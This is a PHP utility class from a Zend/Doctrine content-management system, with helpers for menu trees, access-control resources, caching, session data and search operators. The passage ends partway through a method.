<?php
/**

 * Rhema studio utility class functions

 *

 */
class Rhema_Util implements Rhema_Cache_Interface {
    protected $_classMethods;
    protected $_cache;
    protected $_frontend;
    protected $_backend;
    protected $_frontendOptions = array();
    protected $_backendOptions = array();
    protected $_model;
    protected $_tagged;
    protected $_cacheType = 'Class';
    protected static $allowed = array(Rhema_Constant::MENU_MODULE, Rhema_Constant::MENU_CONTROLLER, 'm_action', 'title', 'route', 'rel', 'label', 'class', 'slug', 'id');
    protected static $_instance;
    protected static $_aclList = array();
    public static $category = array();
    
    /**
	 * @return the $category
	 */
	public static function getCategory() {
		return Rhema_Util::$category;
	}

	/**
	 * @param field_type $category
	 */
	public static function setCategory($category) {
		Rhema_Util::$category = $category;
	}

	protected function __construct(){
    }
    
    private function __clone(){
    }
    public static function getInstance(){
        if(null === self::$_instance){
            self::$_instance = new self();
        }
        return self::$_instance;
    }
    /**

     * Delete files all files in directory recursivelu



     * @param  $dir ; directory to cleanup

     * @return number ; number of files deleted

     */
    public static function cleanupDirectory($dir){
        $count = 0;
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir ), RecursiveIteratorIterator::CHILD_FIRST );
        foreach($iterator as $path){
            if($path->isDir()){
                @rmdir($path->__toString() );
            }else{                
                $path = $path->__toString() ;
                div("deleting $path", '');
                @unlink($path);
                div('done!',"\n", '');
                $count ++;
            }
        }
        return $count;
    }
    /**

     * Generates the array options for a select form element.

     *

     * @param string_type $keyField option value

     * @param string_type $valueField option label

     * @param array_type $data associative array

     * @return array

     */
    public static function generateOptionArray($data, $keyField = 'id', $valueField = 'id title', $showEmpty = false){
        $returnData = array();
        if($showEmpty){
            $returnData[''] = 'select';
        }
        if(count($data )){
            $temp = array_filter(explode(' ', $valueField ) );
            foreach($data as $arr){
                if(isset($arr[$keyField] )){
                    $toUse = array();
                    foreach($temp as $f){
                        if(isset($arr[$f] )){
                            $toUse[] = $arr[$f];
                        }
                    }
                    $userField = count($toUse ) ? implode(' ', $toUse ) : $arr[end($data )];
                    $returnData[$arr[$keyField]] = $userField;
                }
            }
        }
        return $returnData;
    }
    /*

		public static function generateOptionArray($data, $keyField = 'id', $valueField ='title', $showEmpty = false, $html = false){

			$return = $showEmpty ? '' : array();

			if(count($data)){

				if($html){

					$return = '<select><optgroup>';

					if($showEmpty){

						$return .= '<option value="">select</option>';

					}

				}elseif($showEmpty){

					$return[''] = 'select';

				}



				$temp  = array_filter(explode(' ', $valueField));



				foreach($data as $arr){

					if(isset($arr[$keyField])){

						$toUse = array();

						foreach($temp as $f){

							if(isset($arr[$f])){

								$toUse[] = $arr[$f];

							}

						}

						$userField = count($toUse) ? implode(' ', $toUse) : $arr[end($data)];

						if($html){

							$return .= '<option value="' . $arr[$keyField].'">' . $userField  . '</option>';

						}else{

							$return[$arr[$keyField]] = $userField ;

						}

					}

				}

				if($html){

					$return .= '</optgroup></select>';

				}



			}



			return $return;

		}

		*/
    public function getDictionary(){
        $dictionary = ADMIN_PREFIX . 'AdminDictionary';
        $tableModel = ADMIN_PREFIX . 'AdminTable';
        $dict = array();
        $query = Doctrine_Query::create()->select('t.title,t.label' )->from("$dictionary t INDEXBY t.title" )->setHydrationMode(Doctrine_Core::HYDRATE_ARRAY );
        $res1 = $query->execute();
        //;
        $query = Doctrine_Query::create()->select('m.title,m.name' )->from("$tableModel m" )->setHydrationMode(Doctrine_Core::HYDRATE_ARRAY );
        $res2 = $query->execute();
        //;
        $res3 = Admin_Model_AdminTable::listDatabaseTables();
        foreach($res2 as $item){
            $dict[$item['name']] = $item;
        }
        $output = array_merge($res1, $dict, $res3['bymodel'] );
        return $output;
    }
    public static function getLabel($prompt){
        $store = self::getSessData('dictionary' );
        if(! $store){
            $util = new Rhema_Util();
            $store = $util->getCached()->getDictionary();
            self::setSessData('dictionary', $store );
        }
        if(isset($store[$prompt]['label'] )){
            $value = $store[$prompt]['label'];
        }elseif(isset($store[$prompt]['title'] )){
            $value = $store[$prompt]['title'];
        }else{
            $value = str_replace('_', ' ', $prompt );
        }
        return ucwords($value );
    }
    public static function setAjaxData($value, $key = null){
        $data = $key ? array($key => $value) : $value;
        Zend_Registry::set(AJAX_NAMESPACE, $data );
    }
    public static function getAjaxData(){
        $data = null;
        if(Zend_Registry::isRegistered(AJAX_NAMESPACE )){
            $data = Zend_Registry::get(AJAX_NAMESPACE );
        }
        return $data;
    }
    public static function getEditOptions($model, $column, $key = 'id', $opt = 'title', $show = false){
        $mFilter = new Rhema_Filter_FormatModelName();
        $model = $mFilter->filter($model );
        $parentTable = $mFilter->filter($column );
        $filter = new Rhema_Dao_Filter();
        $filter->setModel($$model )->setParentTable($parentTable )->setSelectKey($key )->setSelectDisplayField($opt );
        $result = Rhema_Model_Service::createEditOptionQuery($filter )->execute();
        $options = Rhema_Util::generateOptionArray($result, $key, $opt, $show );
        return $options;
    }
    public static function nestify($arrs, $depth_key = 'level', $admin = false){
        $nested = array();
        $depths = array();
        if(is_array($arrs )){
            foreach($arrs as $key => $arr){
                self::addRoute($arr, $admin );
                if($arr[$depth_key] == 0){
                    $nested[$key] = $arr;
                    $depths[$arr[$depth_key] + 1] = $key;
                }else{
                    $parent = & $nested;
                    for($i = 1; $i <= ($arr[$depth_key]); $i ++){
                        if(isset($depths[$i] )){
                            $parent = & $parent[$depths[$i]];
                        }
                    }
                    $parent[$key] = $arr;
                    $depths[$arr[$depth_key] + 1] = $key;
                }
            }
        }
        return $nested;
    }
    public static function addRoute(&$arr, $isAdmin = false, $route = FRONT_MENU_ROUTE){
        if(! isset($arr['route'] )){
            $route = $isAdmin ? ADMIN_ROUTE : $route;
            $arr['route'] = $route;
        }
    }
    public static function treeAsHtml($tree){
        $html = "<ul>\n";
        $count = count($tree );
        for($i = 0; $i < $count; $i ++){
            $isLeaf = ($tree[$i]['lft'] + 1) == $tree[$i]['rgt'] ? true : false;
            $class = $isLeaf ? '' : " class='open' ";
            $html .= "<li id='li_" . $tree[$i]['id'] . "' $class  rel='default'>

				  <a href='#'><ins>&nbsp;</ins>" . $tree[$i]['title'] . '</a>';
            if(! $isLeaf){
                $html .= "\n<ul>\n";
            }elseif($isLeaf){
                $repeat = $tree[$i]['level'] > 0 ? $tree[$i]['level'] : 1;
                $html .= "</li>\n";
                $html .= str_repeat("</ul>\n</li>", $repeat );
            }
        }
        $html .= "\n</ul>";
        return $html;
    }
    public static function getMenuResource($data){
        return "mvc:$data[m_module].$data[m_controller]";
    }
    public static function getMenuPrivilege($data){
        return $data['m_action'];
    }
    
    public static function toContainerFormat($arr, $type = null, $branch = 0, $isAdmin = false, $countData = array()){
        $final    = array();
        $scope    = $isAdmin ? 'admin' : 'site';
        
        if(!isset(self::$_aclList[$scope])){
        	self::$_aclList[$scope] = self::getAcl($scope);
        } 
   
        $acl      = self::$_aclList[$scope]; //  self::getAcl($scope);
        $loggedIn = Zend_Auth::getInstance()->hasIdentity();
        if(is_array($arr )){
            foreach($arr as $a => $data){
                if(count($data['__children'] )){
                    $branch = ($data['rgt'] - $data['lft']) > 1 ? true : false;
                    $add = self::toContainerFormat($data['__children'], $type, $branch, $isAdmin );
                    $final[$a]['pages'] = $add;
                }
                if($data[Rhema_Constant::MENU_MODULE] and $data[Rhema_Constant::MENU_CONTROLLER]){
                    $resource = self::getMenuResource($data );
                    if(! $acl->has($resource )){
                        $acl->addResource(new Zend_Acl_Resource($resource ) );
                    }
                    $final[$a]['resource'] = $resource; //"mvc:$data[m_module].$data[m_controller]";
                    if($data[Rhema_Constant::MENU_ACTION]){
                        if($data[Rhema_Constant::MENU_ACTION] == 'login' and $loggedIn){
                            $data['is_visible'] = false;
                        }
                        if($data[Rhema_Constant::MENU_ACTION] == 'logout' and ! $loggedIn){
                            $data['is_visible'] = false;
                        }
                        $final[$a]['privilege'] = self::getMenuPrivilege($data );
                    }
                }
                self::addRoute($data, $isAdmin );
                $final[$a]['visible'] = $data['is_visible'] ? true : false;
                $final[$a]['id'] = $data['id'];
                if($data['image_file']){
                    list($bgImage, ) = explode('.', basename($data['image_file'] ) );
                    $data['class'] = preg_replace('/[^a-z\-_]+/i', '', strtolower($bgImage ) );
                }
                //$currentKey = key ( $data );
                if(isset($data['m_route'] ) and $data['m_route']){
                    $data['route'] = $data['m_route'];
                }else{
                    self::getRoute($type, $data['route'], $branch, $data[Rhema_Constant::MENU_MODULE] );
                }
                if(MODEL_PREFIX . 'EcomNavigationMenu' == $type and $data['ecom_category_id']){
                    $final[$a]['params'][CATEGORY_MAP] = self::getCategoryName($data['ecom_category_id'] );
                }
                
                if(MODEL_PREFIX . 'AffiliateProductCategory' == $type){
                	$catId = $data['id'];
                	$count = isset(self::$category[$catId]['countid']) ? self::$category[$catId]['countid'] : 0;
                	if($count){
                		$count = number_format($count);
                		$data['label'] = $data['label'] . " ({$count})";
                	}
                }
                foreach(self::$allowed as $ind){
                    if(isset($data[$ind] )){
                        $menuKey = str_replace('m_', '', $ind );
                        $final[$a][$menuKey] = $data[$ind];
                    }
                }
                if(! $isAdmin){
                    if(isset($data['Page'] ) and $data['Page'][Rhema_Constant::MENU_FRONTEND_KEY]){
                        $final[$a]['params'][Rhema_Constant::MENU_FRONTEND_KEY] = $data['Page'][Rhema_Constant::MENU_FRONTEND_KEY];
                    }else{
                        $final[$a]['params'][Rhema_Constant::MENU_FRONTEND_KEY] = $data[Rhema_Constant::MENU_ACTION];
                    }
                    if(isset($data['params'] )){
                        parse_str($data['params'], $arr );
                        $final[$a]['params'] += array_filter($arr );
                    }
                }
            }
        }
        return $final;
    }
    public function edit($arr){
        $data = array();
        foreach($arr as $index => $val){
            foreach($val as $k => $v){
                $add = false;
                if(is_array($v )){
                }else{
                    if($data[Rhema_Constant::MENU_MODULE] and $data['controller'] and $data[Rhema_Constant::MENU_ACTION]){
                        $final['resource'] = "mvc:$data[module].$data[controller]";
                        $final['privilege'] = $data[Rhema_Constant::MENU_ACTION];
                    }
                    switch($k) {
                        case 'visible' :
                            {
                                break;
                            }
                        case 'route' :
                            {
                                break;
                            }
                        case 'ecom_category_id' :
                            {
                                break;
                            }
                        case preg_match('/(module|controller|action|title|rel|label|id)$/i', $k ) :
                            {
                            }
                    }
                    if($add){
                        $arr[$index][$k] = $v;
                    }
                }
            }
        }
    }
    public static function getCategoryName($categoryId){
        $util = Rhema_Util::getInstance();
        $options = $util->getCached()->getEditOptions('ecom', 'ecom_category_id', 'id', 'slug' );
        return isset($options[$categoryId] ) ? $options[$categoryId] : $categoryId;
    }
    public static function getRoute($type, &$route, $branch = 0, $module = ''){
        $test = strtolower(str_replace(MODEL_PREFIX, '', $type ) );
        switch($test) {
            case 'ecomNavigationmenu' :
                {
                    if($branch){
                        $route = BRANCH_ROUTE;
                    }else{
                        $route = CATEGORY_ROUTE;
                    }
                    break;
                }
            case 'menu' :
                {
                    if($module == DEFAULT_MODULE){
                        $route = FRONT_MENU_ROUTE;
                    }else{
                        $route = ADMIN_ROUTE;
                    }
                    break;
                }
            default :
                $route = ADMIN_ROUTE;
                break;
        }
    }
    public function treeAsContainer($tree){
        $menu = array();
        $count = count($tree );
        for($i = 0; $i < $count; $i ++){
            $menu[$i] = $tree;
            if(($tree[$i]['lft'] + 1) < $tree[$i]['rgt']){
                $menu[$i]['pages'] = array();
            }elseif(($tree[$i]['lft'] + 1) == $tree[$i]['rgt']){
                $html .= "</li>\n";
                $html .= str_repeat("</ul>\n</li>", $tree[$i]['level'] - 1 );
            }
        }
        $html .= "\n</ul>";
        return $html;
    }
    public function setCache(Rhema_Cache_Abstract $cache){
        $this->_cache = $cache;
    }
    public function setCacheOptions(array $options){
        $this->_cacheOptions = $options;
    }
    public function getCacheOptions($type = 'class-file', $obj = null, $lifetime = null){
    	$lifetime = ($lifetime !== null) ? $lifetime : Rhema_SiteConfig::getConfig('settings.cache_lifetime');
    	
        if(empty($this->_cacheOptions[$type] )){
            $manager = Zend_Registry::get('cache-manager' );
            $template = $manager->getCacheTemplate($type );
            
            if($lifetime > 0){
                $template['frontend']['lifetime']['options'] = $lifetime;
            }
            if($obj){
                $template['frontend']['options']['cached_entity'] = $obj;
            }
            $this->_cacheOptions[$type] = array('frontend' => $template['frontend']['name'], 
									            'backend' => $template['backend']['name'], 
									            'frontendOptions' => $template['frontend']['options'], 
									            'backendOptions' => $template['backend']['options']
									            );
       }
        return $this->_cacheOptions[$type];
    }
    public function getCached($tagged = null){
        if(defined('NO_CACHE' ) and NO_CACHE){
            return $this;
        }
        if(null == $this->_cache){
            $this->_cache = new Rhema_Cache($this, $this->getCacheOptions() );
        }
        $this->_cache->setTagged($tagged );
        return $this->_cache;
    }
    public static function dontEdit($field, &$posted = array(), $table = ''){
        $string = 'lft|rgt|root_id|slug|layout|admin_subsite_id|level';
        if(count($posted )){
            switch($table) {
                case MODEL_PREFIX . 'AdminSetting' :
                    {
                        $siteSetting = isset($posted['setting'] ) ? $posted['setting'] : null;
                        if($siteSetting){
                            $string .= '|field_type|admin_table_id|module|note';
                        }
                        break;
                    }
                default :
                    switch($field) {
                        case 'admin_subsite_id' :
                            {
                                $posted[$field] = Rhema_Util::getSessData('subsiteId' );
                                break;
                            }
                    }
            }
        }
        return preg_match("/^($string)$/i", $field );
    }
    public static function getPrefix(&$model, $dbase = null){
        $front = Zend_Controller_Front::getInstance();
        $testString = strtolower(substr($model, 0, 4 ) );
        switch($testString) {
            case 'help' :
                $prefix = HELP_PREFIX;
                break;
            case 'ecom' :
                $prefix = ECOM_PREFIX;
                break;
            case 'admi' :
                $prefix = ADMIN_PREFIX;
                break;
            case 'blog' :
                $prefix = BLOG_PREFIX;
                break;
            default :
                switch($dbase) {
                    case 'help' :
                        $prefix = HELP_PREFIX;
                        break;
                    default :
                        $prefix = MODEL_PREFIX;
                }
        }
        return $prefix;
    }
    public static function buildLayoutSection($section, $arr, $man, $opt, $plates){
        $str = "<div id='section-{$section}-div'><ul id='sxn{$section}' class='sortable'>";
        $hide = '';
        if(isset($arr[$section] )){
            foreach($arr[$section] as $val){ //$itemId => $data){
                foreach($val as $type => $data){
                    foreach($data as $itemId => $itemSeq){
                        if('plate' == $type){
                            $label = 'plate to change this';
                            $label = isset($plates[$itemId] ) ? $plates[$itemId]['BoilerPlate']['title'] : null;
                        }else{
                            $label = isset($man[$itemId] ) ? $man[$itemId]['label'] : (isset($opt[$itemId] ) ? $opt[$itemId]['Field']['label'] : null);
                        }
                        $str .= "<li id='li_$type-$itemId '><ins class='default'>&nbsp;</ins>$label<ins class='delete'></ins></li>";
                    }
                }
            }
            $hide = 'style="display:none"';
        }
        $str .= "<li id='sxn{$section}_0' class='no-sort' $hide><ins class='empty'>&nbsp;</ins> Empty</li></li>

	   					</ul></div>";
        return $str;
    }
    public static function table2Model($table, $dbase = null){
        $edFilter = new Zend_Filter_Word_UnderscoreToCamelCase();
        $table = $edFilter->filter(str_replace('_id', '', $table ) );
        return MODEL_PREFIX . $table;
    }
    /*

		public function getLeftNavigation($baseUrl){

			$dbTables     =  self::getAllTableItems(MODEL_PREFIX . 'AdminTable');

			$str = '<ul>';

			foreach($dbTables as $table => $label){

				$href = $this->assemble(array('module'=>'admin','controller'=>'grid','action'=>'index','format'=>'grid', 'table' => $table), ADMIN_ROUTE);

				$str .= "<li><ins> </ins><a href='$href' class='table-name'>$label</a></li>";

			}

			$str .= '</ul>';



   			$result['obtables'] = $dbTables;

   			$result['dbtables'] = $str;



   			return $result;

		}

	*/
    public static function isTreeTable($table){
        //return false; //
        return substr(strtolower($table ), - 4 ) == 'menu';
    }
    public static function getIdFromNode($node){
        $parts = explode('-', $node );
        return end($parts );
    }
    public static function setHeaderFiles($file = array(), $type = 'script'){
        $index = HEADFILE_PREFIX . $type;
        if(Zend_Registry::isRegistered($index )){
            $store = Zend_Registry::get($index );
        }else{
            $store = array();
        }
        if(is_array($file ) and count($file )){
            $store = array_merge_recursive($store, $file );
        }elseif($file){
            $store[] = $file;
        }
        Zend_Registry::set($index, $store );
    }
    public static function getHeaderFiles($type = 'script'){
        $index = HEADFILE_PREFIX . $type;
        if(Zend_Registry::isRegistered($index )){
            $store = Zend_Registry::get($index );
        }else{
            $store = array();
        }
        return $store;
    }
    
    public static function getSessData($key, $default = null){
        $namespace = Zend_Registry::get('namespace');
        return isset($namespace->$key ) ? $namespace->$key : $default;
    }
    public static function unsetSessData($key){
    	$namespace = Zend_Registry::get('namespace');
        if($namespace->$key){
            unset($namespace->$key );
        }
    }
    public static function setSessData($key, $value){
    	$namespace = Zend_Registry::get('namespace'); 
        $namespace->$key = $value;
    }
    public static function getDecor($class = ''){
        $cls[] = 'ui-corner-all';
        $cls[] = $class;
        $clsStr = join(' ', array_filter($cls ) );
        return array('ViewHelper', 'FormElements', array('Label', array('tag' => 'span')), array('HtmlTag', array('tag' => 'div', 'class' => $clsStr)));
    }
    /**

     * Populates the admin_table table with all tables defiined in the database

     * Used when setting up the admin section for the first time

     *

     */
    public static function adminTables(){
        $manager = Doctrine_Manager::getInstance();
        $manager->setCurrentConnection('con2' );
        $con = $manager->getCurrentConnection();
        $tables = $con->import->listTables();
        $class = MODEL_PREFIX . 'AdminTable';
        //$inDb    = Doctrine_Core::getTable($class)->findAll(Doctrine_Core::HYDRATE_ARRAY);
        $manager->setCurrentConnection('con1' );
        $con = $manager->getCurrentConnection();
        foreach($tables as $tableName){
            $temp = new $class();
            $temp->name = $tableName;
            $temp->admin_database_id = 1;
            $temp->admin_category_id = 1;
            $temp->title = self::getLabel($tableName );
        }
        $con->flush();
    }
    public static function dataDictionary(){
        $manager = Doctrine_Manager::getInstance();
        $manager->setCurrentConnection('con2' );
        $con = $manager->getCurrentConnection();
        $tables = $con->import->listTables();
        foreach($tables as $tableName){
            if(preg_match('/^(admin__model__admin_dictionary_index|admin__model__component_version|doctrine__record__abstract)$/i', $tableName ))
                continue;
            $model = self::table2Model($tableName );
            $columns = Doctrine_Core::getTable($model )->getColumns();
            /*foreach($columns as $col => $data){

					if('level' != $col) {

						$allCols[] = $col;

					}

				}	*/
            $allCols = array_keys($columns );
        }
        $allCols = array_unique($allCols );
        foreach($allCols as $val){
            $entry = new Admin_Model_AdminDictionary();
            $entry->title = $val;
            $entry->label = ucwords(str_replace('_', ' ', $val ) );
            $entry->save();
        }
        $con->flush();
    }
    public static function transformSearch(&$query, $field, $string, $oper, $type = 'and'){
        if(preg_match('/^(or|and)$/i', $type )){
            $type = strtolower($type );
            $funcName = $type . 'Where';
            switch($oper) {
                case 'eq' :
                    $query->$funcName("$field =  ?", $string );
                    break;
                case 'ne' :
                    $query->$funcName("$field <> ?", $string );
                    break;
                case 'lt' :
                    $query->$funcName("$field <  ?", $string );
                    break;
                case 'le' :
                    $query->$funcName("$field <= ?", $string );
                    break;
                case 'gt' :
                    $query->$funcName("$field > ?", $string );
                    break;
                case 'ge' :
                    $query->$funcName("$field >= ?", $string );
                    break;
                case 'bw' :
                    $query->$funcName("$field LIKE ?", "$string%" );
                    break;
                case 'ew' :
                    $query->$funcName("$field LIKE ?", "%$string" );
                    break;
                case 'cn' :
                case 'in' :
                    $query->$funcName("$field LIKE ?", "%$string%" );
                    break;
                case 'nc' :
                case 'ni' :
                    $query->$funcName("$field NOT LIKE ?", "%$string%" );
                    break;
                case 'bn' :
                    $query->$funcName("$field NOT LIKE ?", "$string%" );
                    break;
                case 'en' :
                    $query->$funcName("$field NOT LIKE ?", "%$string" );
                    break;
                default :
            }
        }
    }
    public static function getOperator($code, &$string){
        switch($code) {
            case 'ne' :
                $operator = ' <> ';
                break;
            case 'lt' :
                $operator = ' < ';
                break;
            case 'le' :
                $operator = ' <= ';
                break;
            case 'gt' :
                $operator = ' >';
                break;
            case 'ge' :
                $operator = ' >= ';
                break;
            case 'bw' :
                $operator = ' LIKE ';
                $string = "$string%";
                break;
            case 'ew' :
                $operator = ' LIKE ';
                $string = "%$string";
                break;
            case 'cn' :
            case 'in' :
                $operator = ' LIKE ';
                $string = "%$string%";
                break;
            case 'nc' :
            case 'ni' :
                $operator = ' NOT LIKE ';
                $string = "%$string%";
                break;
            case 'bn' :
                $operator = ' NOT LIKE ';
                $string = "$string%";
                break;
            case 'en' :
                $operator = ' NOT LIKE ';
                $string = "%$string";
                break;
            case 'eq' :
            default :
                $operator = '=';
                break;
        }
        return $operator;
    }
    public static function getPiece($item, $sep = '-', $num = -1){
        $piece = null;
        $parts = explode($sep, $item );
        $cnt = count($parts );
        if($cnt){
            $index = ($num == - 1) ? $cnt + $num : intVal($num );
            $piece = isset($parts[$index] ) ? $parts[$index] : null;
        }
        return $piece;
    }
    public static function toHierarchy($collection){
        // Trees mapped
        $trees = array();
        $l = 0;
        if(count($collection ) > 0){
            // Node Stack. Used to help building the hierarchy
            $stack = array();
            foreach($collection as $node){
                $item = $node;
                $item['children'] = array();
                // Number of stack items
                $l = count($stack );
                // Check if we're dealing with different levels
                while($l > 0 && $stack[$l - 1]['level'] >= $item['level']){
                    array_pop($stack );
                    $l --;
                }
                // Stack is empty (we are inspecting the root)
                if($l == 0){
                    // Assigning the root node
                    $i = count($trees );
                    $trees[$i] = $item;
                    $stack[] = & $trees[$i];
                }else{
                    // Add node to parent
                    $i = count($stack[$l - 1]['children'] );
                    $stack[$l - 1]['children'][$i] = $item;
                    $stack[] = & $stack[$l - 1]['children'][$i];
                }
            }
        }
        return $trees;
    }
    public static function getContent($itemId, $type, $table = null){
        $type = strtolower($type );
        switch($type) {
            case 'adminelement' :
                {
                    $content = Admin_Model_AdminElement::getElement($itemId );
                    break;
                }
            case 'webform' :
                {
                    $content = Admin_Model_WebForm::getItem($itemId );
                    break;
                }
            case 'crumb' :
                {
                    $content = self::getMenu($itemId, $table );
                    break;
                }
            case 'menu' :
                {
                    $content = self::getMenu($itemId, $table );
                    break;
                }
            case 'component' :
            default :
                {
                    $content = Admin_Model_Component::getItem($itemId );
                    break;
                }
        }
        return $content;
    }
    public static function getMenu($id, $table){
        $util = Rhema_Util::getInstance();
        $option = array('root_id' => $id);
        $loggedIn = Zend_Auth::getInstance()->hasIdentity();
        return $util->getCached($table )->getMainMenu($option, $table, $loggedIn );
    }
    public static function fillArrayWithFileNodes(DirectoryIterator $dir){
        $data = array();
        foreach($dir as $node){
            if($node->isDir() and ! $node->isDot()){
                $data[$node->getFilename()] = self::fillArrayWithFileNodes(new DirectoryIterator($node->getPathname() ) );
            }else if($node->isFile()){
                $data[] = $node->getFilename();
            }
        }
        return $data;
    }
    public static function getWidgetClassname($name){
        $cntrfilter = new Zend_Filter_Word_DashToCamelCase();
        return 'Rhema_Widget_Controller_' . ucfirst($cntrfilter->filter($name ) );
    }
    public static function getWidgetViewName($action){
        $viewFile = str_replace(WIDGET_SEP, DIRECTORY_SEPARATOR, $action ) . '.phtml';
        return ucfirst($viewFile );
    }
    public static function getMethodName($method){
        $methodFilter = new Zend_Filter_Word_DashToCamelCase();
        $method = $methodFilter->filter($method );
        $method = self::lcfirst($method );
        return $method . Rhema_Constant::WIDGET_SUFFIX;
    }
    public static function lcfirst($string){
        return strtoupper(substr($string, 0, 1 ) ) . substr($string, 1 );
    }
    public static function buildWidgetList(DirectoryIterator $dir){
        clearstatcache();
        $filter = new Zend_Filter_Word_CamelCaseToDash();
        $titleFilter = new Zend_Filter_Word_DashToSeparator();
        $cntrFilter = new Zend_Filter_Word_CamelCaseToDash();
        $titleFilter->setSeparator(' ' );
        $blankArray = array('' => 'Select');
        $data = array();
        foreach($dir as $node){
            if(! $node->isDir() and ! $node->isDot()){
                $filename = $node->getPathname();
                $name         = str_replace('.php', '', basename($filename ) );
                $classname    = self::getWidgetClassname($name );
                $classMethods = get_class_methods($classname );
                foreach($classMethods as $meth){
                    if(substr($meth, - 6 ) == 'Method'){
                        $view = strtolower($filter->filter(substr($meth, 0, - 6 ) ) );
                        $viewFile = WIDGET_PATH . '/View/' . ucfirst($name) . '/' . $view . '.phtml';
                        if(is_file($viewFile ) and file_exists($viewFile )){
                            $name = strtolower($cntrFilter->filter($name ) );
                            $widgetValue = $name . '~' . $view;
                            $data[$name][$widgetValue] = ucwords($titleFilter->filter($view ) );
                        }
                    }
                }
                if(isset($data[$name] ) and count($data[$name] )){
                    asort($data[$name] );
                }
            }
        }
        ksort($data );
        $data = $blankArray + $data;
        return $data;
    }
    /**

     * Build a list of directories or filenames in that path specified

     * @param string $path

     * @param boolean $dirOnly ; List only directories

     * @param boolean $action  ; List file names in the view script directory that corresponds to a controller action

     * @param boolean $showBlank ; show the default blank field;

     * @return array

     */
    public static function getDir($path = '', $dirOnly = true, $action = false, $showBlank = true){
        $dirPath = realpath(APPLICATION_PATH . $path );
        $iterator = new DirectoryIterator($dirPath );
        $blankArray = array('' => 'select');
        foreach($iterator as $fileinfo){
            if($fileinfo->isDir() == $dirOnly and ! $fileinfo->isDot()){
                $dirName = $action ? self::getActionName($fileinfo->getFilename() ) : $fileinfo->getFilename();
                if(! preg_match('/^(\.|partials)/i', $dirName )){
                    $arr[$dirName] = $dirName;
                }
            }
        }
        if($showBlank){
            $arr = $blankArray + $arr;
        }
        return $arr;
    }
    public static function getActionName($file){
        $parts = explode('.', strtolower($file ) );
        return $parts[0];
    }
    public static function setHelpFields(){
        $fld = Doctrine_Core::getTable('Help_Model_Document' )->getColumns();
        foreach($fld as $col => $d){
            $rt = new Help_Model_Field();
            $rt->title = $col;
            $rt->label = self::getLabel($col );
            $rt->save();
        }
    }
    public function getMainMenu($option = array(), $type = 'menu', $loggedIn = false){
        return $this->buildNavigation($option, $type );
    }
    public function buildNavigation($option = array(), $type = 'Admin_Model_AdminMenu'){
        $moduleData = array();
        $roots = array();
        $tree = Admin_Model_AdminMenu::getMenuTree($option, $roots, $type, $moduleData );
        $menus = self::toContainerFormat($tree, $type );
        $result['raw'] = $tree;
        $result['moduleData'] = $moduleData;
        $result['roots'] = $roots;
        $result['menus'] = $menus;
        $result['container'] = new Zend_Navigation($menus );
        return $result;
    }
    public function getModules(){
        return Admin_Model_AdminModuleSubsite::getSiteModules();
    }
    public function getLicencedModules(){
        return Admin_Model_AdminModule::getSiteModules();
    }
    /*	public function moduleNavigation($mod = 'cms', $loggedIn = false){

		$root_id = null;

		$isAdmin = true;

		$moduleFound = false;

		$option = array( Rhema_Constant::MENU_MODULE => $mod);



		$menu = Rhema_Model_Service::factory('AdminMenu');

		$modObject = Rhema_Model_Service::factory('AdminModule');

		$modules = $modObject->getSiteModules();



		foreach($modules as $item){

			if($mod == $item['code']){

				$root_id = $item['admin_menu_id'];

				$option = array(

						'root_id' => $root_id);

				$moduleFound = true;

				$curMod = $item;

				break;

			}

		}



		$option = array('root_id' => $root_id);

		$dto = $menu->getMenuTree($option);

		$dto->setModules($modules);

		if($moduleFound){

			$dto->setModuleData($item);

		}



		return $dto;

	}*/
    public function assemble($url, $route = '', $type = 1){
        switch($type) {
            case 1 :
                {
                    $router = Zend_Controller_Front::getInstance()->getRouter();
                    $str = $router->assemble($url, $route );
                    break;
                }
            case 2 :
                {
                    Zend_Controller_Front::getInstance()->getRouter();
                    $url['baseUrl'] = Zend_Registry::get('baseUrl' );
                    $str = '?' . http_build_query($url ) . '&';
                    $str = '?' . http_build_query($url ) . '&';
                    break;
                }
        }
        return $str;
    }
    public function confirmHiddenColumn($column, $table){
        $front = Zend_Controller_Front::getInstance();
        $request = $front->getRequest();
        $module = $request->getParam('module' );
        $arr = array();
        if('admin' != $module){
            switch($module) {
                case MODEL_PREFIX . 'AdminSetting' :
                    {
                        if(preg_match('/(field_type|admin_table_id)$/i', $column )){
                            $arr['editrules']['edithidden'] = false;
                            $arr['hidden'] = false;
                            $arr['editable'] = false;
                        }
                        break;
                    }
            }
        }
    }
    public static function getSetting($id){
        $settingKey = WEB_SETTING_INDEX;
        $arr = self::getSessData($settingKey );
        if(! ($arr and count($arr ))){
            $settings = Admin_Model_Setting::getAllSettings();
            self::setSessData($settingKey, $settings );
        }
        return isset($settings[$id] ) ? $settings[$id] : null;
    }
    public static function filterText($text){
        $pattern = "/([\r\n]+[\s\t]*[\r\n]+|[\r\n]+|[\t]+|[\r\n]+|\s\s+)/";
        return preg_replace($pattern, ' ', $text );
    }
    public function formatImageName($str){
        $str = strtolower($str );
        $str = preg_replace('/\s+/', '-', $str );
        $str = preg_replace('/[^a-zA-Z0-9-]/', '', $str );
        return $str;
    }
    
    public static function getAcl($scope, $refresh = false){
        $index = "acl_$scope";
        $acl   = self::getSessData($index );
        if(! $acl or $refresh){
            $aclObject = Rhema_Model_Service::factory('admin_acl' );
            $acl       = $aclObject->getAcl($scope );
           self::setSessData($index, $acl );
        }
        return $acl;
    }
    
    public function getLeftNavigation(){
        $result = Admin_Model_AdminTable::listDatabaseTables();
        return $result;
    }
    public function getContentTypes(){
        return Admin_Model_AdminContentType::getContentTypes('Admin_Model_AdminContentType' );
    }
    public function getFeaturedItems(){
        return Admin_Model_Featured::getFeaturedItems();
    }
    public static function getTableId($sourceModel){
        $key = 'table-by-id';
        $util = Rhema_Util::getInstance();
        $byId = $util->getSessData($key );
        if(! ($byId and isset($byId[$sourceModel] ) and $byId[$sourceModel])){
            $list = $util->getCached('admin_table_id' )->getLeftNavigation();
            $sourceId = isset($list['bymodel'][$sourceModel] ) ? $list['bymodel'][$sourceModel]['id'] : null;
            $byId[$sourceModel] = $sourceId;
            $util->setSessData($key, $byId );
        }else{
            $sourceId = $byId[$sourceModel];
        }
        return $sourceId;
    }
    public function formatItemId($prefix, $id, $siz = 5){
        $num = str_pad($id, $siz, 0, STR_PAD_LEFT );
        return strtoupper($prefix . $num );
    }
    public function getLayoutSections($template_id, $pageId){
        return Admin_Model_TemplateSection::getTemplateSections($template_id, Doctrine_core::HYDRATE_ARRAY );
    }
    public function getTemplateLayout($pageId, $template_id, $type){
